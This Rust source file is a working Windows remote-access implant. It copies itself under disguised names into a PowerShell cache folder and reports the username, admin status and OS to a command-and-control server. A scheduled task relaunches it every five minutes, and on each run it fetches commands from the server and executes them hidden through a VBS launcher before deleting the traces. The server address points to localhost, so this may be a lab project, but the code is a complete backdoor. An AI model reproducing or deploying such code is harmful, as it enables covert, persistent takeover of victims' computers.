extern crate rand;
extern crate reqwest;
extern crate crypto;

use std::io::Read;
use std::fs::File;
use std::io::BufReader;
use std::process::Command;
use std::io::prelude::*;
use rand::Rng;
use self::crypto::digest::Digest;
use self::crypto::sha2::Sha256;

const CC_SERVER: &str = "http://localhost:41450";
const REGISTER_URI: &str = "/convey/register/";
const CMD_URI: &str = "/convey/cmd/";

const HASH_TYPE: &str = "sha256sum";
const SEED_DIR: &str = "/AppData/Local/Microsoft/Windows/PowerShell/";
const SEED_FILE: &str = "ProfileDataCache";
const BIN: &str = "rust-windows.exe";
const BIN_NEW: &str = "AnalyzeProcessCache.exe";
const TEMP_SCRIPT: &str = "CacheRebuild.bat";
const TEMP_LAUNCHER: &str = "ProcessProfile.vbs";

const TASK_NAME: &str = "{3B3CC70E-08F1-46L6-87ED-4AK69034E676}";
const TASK_FREQ_MINUTES: &str = "5";


fn main() {
    /* Get user, home, seed, binary, and seed dir path */

    // Get user env variable
    let mut user = std::env::var("USERNAME")
        .expect("Could not get env var");

    // Check if admin
    let admin_check = Command::new("net")
        .arg("session")
        .status()
        .unwrap();

    if admin_check.success() {
        &mut user.push_str(" (admin)");
    }

    // Get home dir
    let home_dir = std::env::home_dir()
        .expect("Failed to get home dir");

    // Get seed dir path
    let mut seed_path = home_dir.clone();
    seed_path.push(SEED_DIR);
    let seed_dir_path = seed_path.clone();
    let seed_dir_path = seed_dir_path.to_str()
        .expect("Failed to convert path to string");

    // Get binary path
    let mut bin_path = seed_path.clone();
    bin_path.push(BIN_NEW);
    let bin_path = bin_path.to_str()
        .expect("Failed to convert path to string");

    // Get temp script path for running commands
    let mut temp_script_path = seed_path.clone();
    temp_script_path.push(TEMP_SCRIPT);
    let temp_script_path = temp_script_path.to_str()
        .expect("Failed to convert path to string");

    // Get temp script path for silently running script
    let mut temp_launcher_path = seed_path.clone();
    temp_launcher_path.push(TEMP_LAUNCHER);
    let temp_launcher_path = temp_launcher_path.to_str()
        .expect("Failed to convert path to string");

    // Get seed file path
    seed_path.push(SEED_FILE);
    let seed_path = seed_path.to_str()
        .expect("Failed to convert path to string");

    // Check to see if the seed is already initialized
    let seed_exists = std::path::Path::new(seed_path).exists();

    if !seed_exists {
        init_seed(seed_dir_path, seed_path, bin_path);
        register(&seed_path, &user);
        init_task(bin_path);
    } else {
        run_cmd(temp_script_path, temp_launcher_path, seed_path);
    }
}


fn init_seed(seed_dir_path: &str, seed_path: &str, bin_path: &str) {

    // Create seed dir
    std::fs::create_dir_all(seed_dir_path)
        .expect("Failed to create directory");

    // Install binary to seed dir
    std::fs::copy(BIN, bin_path)
        .expect("Failed to copy binary");

    /* Generate seed */

    // Start RNG thread to supply randomness from OS
    let mut rng = rand::thread_rng();

    // Open seed file to write to
    let mut seed = File::create(&seed_path)
        .expect("Failed to write to seed");

    // Generate seed data and write it to the file
    let mut seed_data = String::new();
    for _ in 0..500_000 {
        let random_char = rng.gen::<char>();
        seed_data.push(random_char);
    }
    let seed_data = seed_data.into_bytes();
    seed.write(&seed_data[..])
        .expect("Failed to write to data to seed");
    seed.flush()
        .expect("Failed to write to data to seed");
}


fn register(seed_path: &str, user: &str) {
    /* Gather system information */

    // Get OS
    let operating_sys = Command::new("uname")
        .output().expect("Failed to run command");
    let operating_sys = String::from_utf8_lossy(&operating_sys.stdout);
    let operating_sys = operating_sys.trim();

    // Get seed hash
    let hash_sum = get_seed_hash(&seed_path);

    // Set params for POST request
    let params = [
        ("hash_type", HASH_TYPE),
        ("hash_sum", &hash_sum),
        ("operating_sys", &operating_sys),
        ("user", &user),
    ];

    // Get URL to get command from
    let mut cc_url = String::from(CC_SERVER);
    cc_url.push_str(REGISTER_URI);

    // Send the POST request to register with CC server
    let client = reqwest::Client::new()
        .expect("Failed to init HTTP client");
    client.post(&cc_url).unwrap()
        .form(&params).expect("Failed to create POST form")
        .send().expect("Failed to send request");
}


fn init_task(bin_path: &str) {
    let task_cmd = "schtasks.exe";
    let cmd_args = [
        "/create",
        "/tn", TASK_NAME,
        "/sc",
        "MINUTE",
        "/mo",
        TASK_FREQ_MINUTES,
        "/tr",
        &bin_path,
    ];

    Command::new(&task_cmd)
        .args(&cmd_args)
        .output().expect("Failed to initialize task");
}


fn run_cmd(temp_script_path: &str, temp_launcher_path: &str, seed_path: &str) {
    // Get seed hash
    let hash_sum = get_seed_hash(&seed_path);

    // Set params for POST request
    let params = [
        ("hash_sum", &hash_sum),
    ];

    // Get URL to get command from
    let mut cc_url = String::from(CC_SERVER);
    cc_url.push_str(CMD_URI);

    // Send the POST request to contact CC server
    let client = reqwest::Client::new()
        .expect("Failed to init HTTP client");
    let mut res = client.post(&cc_url).unwrap()
        .form(&params).expect("Failed to create POST form")
        .send().expect("Failed to send request");

    // Get command from CC server response
    let mut cmd = String::new();
    res.read_to_string(&mut cmd)
        .expect("Failed to read to string");

    // Create script file from server response
    let cmd = cmd.into_bytes();
    let mut temp_script = File::create(&temp_script_path)
        .expect("Failed to write to file");
    temp_script.write(&cmd)
        .expect("Failed to write to file");
    temp_script.flush()
        .expect("Failed to write to file");

    // Create silent launcher file
    let launch_cmd =
        String::from("CreateObject(\"Wscript.Shell\").Run WScript.Arguments(0), 0, False")
        .into_bytes();
    let mut temp_launcher = File::create(&temp_launcher_path)
        .expect("Failed to write to file");
    temp_launcher.write(&launch_cmd)
        .expect("Failed to write to file");
    temp_launcher.flush()
        .expect("Failed to write to file");

    // Execute script using silent launcher
    let cmd_args = [&TEMP_LAUNCHER, &TEMP_SCRIPT];
    Command::new("cscript.exe")
        .args(&cmd_args)
        .output()
        .expect("Failed to run command");

    // Delete both files
    std::fs::remove_file(&temp_script_path)
        .expect("Failed to remove file");
    std::fs::remove_file(&temp_launcher_path)
        .expect("Failed to remove file");
}


fn get_seed_hash(file_path: &str) -> String {
    // Read the seed!
    let infile = File::open(file_path)
        .expect("Failed to open file");
    let mut buf_reader = BufReader::new(infile);
    let mut file_contents = String::new();
    buf_reader.read_to_string(&mut file_contents)
        .expect("Failed to read file content into string");

    // Get seed hash sum
    let mut hasher = Sha256::new();
    hasher.input_str(&file_contents);
    hasher.result_str()
}
